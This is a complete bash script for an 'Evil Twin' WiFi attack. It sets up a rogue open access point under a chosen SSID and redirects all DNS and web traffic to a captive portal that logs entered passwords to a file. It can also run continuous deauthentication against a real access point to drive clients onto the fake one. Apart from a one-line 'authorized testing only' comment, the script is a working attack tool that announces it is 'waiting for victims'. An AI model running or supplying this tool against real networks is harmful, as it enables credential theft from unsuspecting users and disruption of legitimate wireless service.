#!/bin/bash
# Evil Twin AP + Captive Portal
# Authorized security testing only

set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
WITH_DEAUTH=0
[ "${1:-}" = "--with-deauth" ] && WITH_DEAUTH=1

PID_HOSTAPD=""
PID_DNSMASQ=""
PID_PORTAL=""
PID_DEAUTH=""
MON_IFACE=""
IFACE=""

cleanup() {
    echo -e "\n${YELLOW}[*] Stopping Evil Twin...${NC}"
    [ -n "$PID_PORTAL" ] && kill "$PID_PORTAL" 2>/dev/null || true
    [ -n "$PID_DNSMASQ" ] && kill "$PID_DNSMASQ" 2>/dev/null || true
    [ -n "$PID_HOSTAPD" ] && kill "$PID_HOSTAPD" 2>/dev/null || true
    [ -n "$PID_DEAUTH" ] && kill "$PID_DEAUTH" 2>/dev/null || true
    killall hostapd dnsmasq 2>/dev/null || true
    pkill -f "captive-portal.py" 2>/dev/null || true
    pkill -f "aireplay-ng" 2>/dev/null || true

    if [ -n "$MON_IFACE" ]; then
        airmon-ng stop "$MON_IFACE" >/dev/null 2>&1 || true
    fi
    if [ -n "$IFACE" ]; then
        ip link set "$IFACE" down 2>/dev/null || true
        ip addr flush dev "$IFACE" 2>/dev/null || true
        ip link set "$IFACE" up 2>/dev/null || true
    fi

    if command -v systemctl >/dev/null 2>&1; then
        systemctl start NetworkManager 2>/dev/null || true
        systemctl start wpa_supplicant 2>/dev/null || true
    fi

    rm -f /tmp/hostapd_wifitool.conf /tmp/dnsmasq_wifitool.conf 2>/dev/null || true
    echo -e "${GREEN}[✓] Stopped${NC}"
    exit 0
}
trap cleanup INT TERM EXIT

echo -e "${CYAN}"
echo "╔════════════════════════════════════╗"
echo "║     Evil Twin + Captive Portal     ║"
echo "╚════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${YELLOW}Interfaces:${NC}"
if command -v iw >/dev/null 2>&1; then
    iw dev 2>/dev/null | awk '/Interface/{print "  "$2}'
fi
ip -o link show 2>/dev/null | awk -F': ' '{print "  "$2}'
echo ""

read -rp "AP interface (e.g. wlan0): " IFACE
[ -z "$IFACE" ] && echo -e "${RED}Interface required${NC}" && exit 1

read -rp "Fake SSID (network name): " SSID
SSID=${SSID:-Free_WiFi}

read -rp "Channel [6]: " CHANNEL
CHANNEL=${CHANNEL:-6}

read -rp "Gateway IP [192.168.99.1]: " GATEWAY
GATEWAY=${GATEWAY:-192.168.99.1}

# Optional target legit AP to deauth/push clients to us
TARGET_BSSID=""
TARGET_CH=""
if [ "$WITH_DEAUTH" -eq 1 ]; then
    echo -e "${YELLOW}[Combo] Deauth real network to push clients to fake AP${NC}"
    read -rp "Target real AP BSSID (or empty to skip): " TARGET_BSSID
    if [ -n "$TARGET_BSSID" ]; then
        read -rp "Target channel [same as above]: " TARGET_CH
        TARGET_CH=${TARGET_CH:-$CHANNEL}
    fi
fi

echo -e "${GREEN}[+] Killing conflicting processes...${NC}"
airmon-ng check kill >/dev/null 2>&1 || true
killall hostapd dnsmasq wpa_supplicant NetworkManager 2>/dev/null || true
if command -v systemctl >/dev/null 2>&1; then
    systemctl stop NetworkManager 2>/dev/null || true
    systemctl stop wpa_supplicant 2>/dev/null || true
fi

# Configure interface as AP (managed mode for hostapd)
ip link set "$IFACE" down
ip addr flush dev "$IFACE"
ip addr add "${GATEWAY}/24" dev "$IFACE"
ip link set "$IFACE" up

# hostapd config
cat > /tmp/hostapd_wifitool.conf <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
ieee80211n=1
wmm_enabled=1
EOF

# dnsmasq config - captive portal redirects all DNS to us
NET_PREFIX=$(echo "$GATEWAY" | awk -F. '{print $1"."$2"."$3}')
cat > /tmp/dnsmasq_wifitool.conf <<EOF
interface=$IFACE
bind-interfaces
dhcp-range=${NET_PREFIX}.10,${NET_PREFIX}.100,255.255.255.0,12h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
server=8.8.8.8
log-queries
log-dhcp
listen-address=$GATEWAY
address=/#/$GATEWAY
EOF

# Enable IP forwarding (optional internet passthrough if you have another iface)
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

echo -e "${GREEN}[+] Starting hostapd (SSID: ${YELLOW}${SSID}${GREEN})...${NC}"
hostapd /tmp/hostapd_wifitool.conf -B
sleep 1
PID_HOSTAPD=$(pgrep -n hostapd || true)
if [ -z "$PID_HOSTAPD" ]; then
    echo -e "${RED}[!] hostapd failed. Check adapter support (nl80211 / AP mode).${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Starting dnsmasq (DHCP/DNS)...${NC}"
dnsmasq -C /tmp/dnsmasq_wifitool.conf --no-daemon >/tmp/dnsmasq_wifitool.log 2>&1 &
PID_DNSMASQ=$!
sleep 1

# iptables redirect HTTP to captive portal
if command -v iptables >/dev/null 2>&1; then
    iptables -t nat -F 2>/dev/null || true
    iptables -F 2>/dev/null || true
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j DNAT --to-destination "${GATEWAY}:80"
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j DNAT --to-destination "${GATEWAY}:80"
    iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
fi

echo -e "${GREEN}[+] Starting captive portal on ${GATEWAY}:80 ...${NC}"
export WIFITOOL_SSID="$SSID"
export WIFITOOL_LOG="$BASE_DIR/logs/captured_passwords.log"
export WIFITOOL_PORTALS="$BASE_DIR/portals"
export WIFITOOL_HOST="$GATEWAY"

python3 "$BASE_DIR/modules/captive-portal.py" &
PID_PORTAL=$!
sleep 1

if ! kill -0 "$PID_PORTAL" 2>/dev/null; then
    echo -e "${RED}[!] Portal failed. Is Flask installed? port 80 free?${NC}"
    exit 1
fi

# Optional deauth using second monitor iface or same if supported
if [ "$WITH_DEAUTH" -eq 1 ] && [ -n "$TARGET_BSSID" ]; then
    echo -e "${RED}[+] Starting deauth against $TARGET_BSSID ...${NC}"
    # try to find another wireless iface or create mon
    DEAUTH_IFACE=""
    # Prefer a dedicated mon iface if user has one
    for cand in wlan1mon wlan1 wlan0mon; do
        if iwconfig "$cand" >/dev/null 2>&1; then
            DEAUTH_IFACE="$cand"
            break
        fi
    done
    if [ -z "$DEAUTH_IFACE" ]; then
        # create monitor on same physical only if a different card exists is safer;
        # try mon on wlan1 if present
        if iw dev | grep -q wlan1; then
            airmon-ng start wlan1 >/dev/null 2>&1
            DEAUTH_IFACE="wlan1mon"
            [ ! -e "/sys/class/net/$DEAUTH_IFACE" ] && DEAUTH_IFACE="wlan1"
            MON_IFACE="$DEAUTH_IFACE"
        else
            echo -e "${YELLOW}[!] No second adapter found. Deauth skipped (need 2 adapters for stable combo).${NC}"
        fi
    fi
    if [ -n "$DEAUTH_IFACE" ]; then
        iwconfig "$DEAUTH_IFACE" channel "$TARGET_CH" 2>/dev/null || true
        aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$DEAUTH_IFACE" --ignore-negative-one >/tmp/deauth_wifitool.log 2>&1 &
        PID_DEAUTH=$!
    fi
fi

echo ""
echo -e "${GREEN}════════════════════════════════════════${NC}"
echo -e "${GREEN}[✓] Evil Twin is LIVE${NC}"
echo -e "  SSID     : ${YELLOW}$SSID${NC}"
echo -e "  Interface: ${YELLOW}$IFACE${NC}"
echo -e "  Channel  : ${YELLOW}$CHANNEL${NC}"
echo -e "  Portal   : ${YELLOW}http://$GATEWAY/${NC}"
echo -e "  Log file : ${YELLOW}$BASE_DIR/logs/captured_passwords.log${NC}"
echo -e "${GREEN}════════════════════════════════════════${NC}"
echo -e "${CYAN}Waiting for victims... credentials print below.${NC}"
echo -e "${RED}Ctrl+C to stop${NC}"
echo ""

# live tail of captures
touch "$BASE_DIR/logs/captured_passwords.log"
tail -n 0 -F "$BASE_DIR/logs/captured_passwords.log" &
TAIL_PID=$!

# keep main alive
while true; do
    if ! kill -0 "$PID_PORTAL" 2>/dev/null; then
        echo -e "${RED}[!] Portal died${NC}"
        break
    fi
    if ! kill -0 "$PID_HOSTAPD" 2>/dev/null && ! pgrep -x hostapd >/dev/null; then
        echo -e "${RED}[!] hostapd died${NC}"
        break
    fi
    sleep 2
done

kill "$TAIL_PID" 2>/dev/null || true
cleanup
